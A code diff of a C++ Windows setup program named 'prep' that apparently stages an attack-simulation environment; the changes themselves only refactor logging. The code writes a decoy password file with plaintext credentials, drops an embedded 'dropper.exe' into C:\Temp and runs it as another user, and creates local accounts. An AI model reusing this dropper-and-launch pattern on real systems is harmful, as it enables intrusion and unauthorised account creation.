@@ -1,7 +1,12 @@
 #include "prep.hpp"
 
+std::string componentName = "prep";
+
 int wmain()
 {
+    Log("[+] Starting " + componentName + ".", componentName);
+    Log("[*] Running as " + UserRunningProcess(), componentName);
+    
     std::filesystem::create_directory(L"C:\\Temp");
     std::filesystem::permissions(L"C:\\Temp", std::filesystem::perms::all);
     
@@ -16,14 +21,14 @@ int wmain()
 
     // create password doc
     if (!CreateDirectoryW(L"C:\\Users\\NineBall", NULL)) {
-        Log("[!] Failed to create NineBall user directory." + std::to_string(GetLastError()), "prep");
+        Log("[!] Failed to create NineBall user directory." + std::to_string(GetLastError()), componentName);
     }
     if (!CreateDirectoryW(L"C:\\Users\\NineBall\\Desktop", NULL)) {
-        Log("[!] Failed to create NineBall desktop directory" + std::to_string(GetLastError()), "prep");
+        Log("[!] Failed to create NineBall desktop directory" + std::to_string(GetLastError()), componentName);
     }
     std::ofstream fs("C:\\Users\\NineBall\\Desktop\\notmypasswords.txt");
     if (!fs) {
-        Log("[!] Failed to create NineBall password document.", "prep");
+        Log("[!] Failed to create NineBall password document.", componentName);
     }
     else {
         fs << "steam : 7sbV9%J1NnPcqxIr\n";
@@ -41,13 +46,13 @@ int wmain()
 
 
     // write the dropper to disk
-    Log("[+] Dropping dropper to disk.", "prep");
+    Log("[+] Dropping dropper to disk.", componentName);
     std::ofstream outfile("C:\\Temp\\dropper.exe", std::ios::out | std::ios::binary);
     outfile.write(&dropper[0], sizeof(dropper)); // try catch?
     outfile.close();
 
     // create dropper process as user Raven
-    Log("[+] Creating dropper process as Raven.", "prep");
+    Log("[+] Creating dropper process as Raven.", componentName);
     STARTUPINFO si;
     PROCESS_INFORMATION pi;
     ZeroMemory(&si, sizeof(si));
@@ -74,10 +79,10 @@ int wmain()
         &si,
         &pi
     )) {
-        Log("[!] Failed to create dropper process." + std::to_string(GetLastError()), "prep");
+        Log("[!] Failed to create dropper process." + std::to_string(GetLastError()), componentName);
     }
     else {
-        Log("[+] Powershell process spawned.", "prep");
+        Log("[+] Powershell process spawned.", componentName);
     }
 
     WaitForSingleObject(pi.hProcess, INFINITE);
@@ -116,17 +121,17 @@ void CreateUser(std::wstring username, std::wstring password) {
     switch (err)
     {
     case 0:
-        Log("[+] User " + std::string(username.begin(), username.end()) + " successfully created.", "prep");
+        Log("[+] User " + std::string(username.begin(), username.end()) + " successfully created.", componentName);
         break;
     case NERR_UserExists:
-        Log("[!] User " + std::string(username.begin(), username.end()) + " already exists.", "prep");
+        Log("[!] User " + std::string(username.begin(), username.end()) + " already exists.", componentName);
         err = 0;
         break;
     case ERROR_INVALID_PARAMETER:
-        Log("[!] Invalid parameter error adding user " + std::string(username.begin(), username.end()) + "; parameter index = " + std::to_string(param_err), "prep");
+        Log("[!] Invalid parameter error adding user " + std::string(username.begin(), username.end()) + "; parameter index = " + std::to_string(param_err), componentName);
         break;
     default:
-        Log("[!] Error adding user " + std::string(username.begin(), username.end()) + " : " + std::to_string(err), "prep");
+        Log("[!] Error adding user " + std::string(username.begin(), username.end()) + " : " + std::to_string(err), componentName);
         break;
     }
 
@@ -144,14 +149,14 @@ void CreateUser(std::wstring username, std::wstring password) {
     switch (err)
     {
     case 0:
-        Log("[+] User " + std::string(username.begin(), username.end()) + " successfully added to local group.", "prep");
+        Log("[+] User " + std::string(username.begin(), username.end()) + " successfully added to local group.", componentName);
         break;
     case ERROR_MEMBER_IN_ALIAS:
-        Log("[!] User " + std::string(username.begin(), username.end()) + " already in local group.", "prep");
+        Log("[!] User " + std::string(username.begin(), username.end()) + " already in local group.", componentName);
         err = 0;
         break;
     default:
-        Log("[!] Error adding user " + std::string(username.begin(), username.end()) + " to local group: " + std::to_string(err), "prep");
+        Log("[!] Error adding user " + std::string(username.begin(), username.end()) + " to local group: " + std::to_string(err), componentName);
         break;
     }
 }
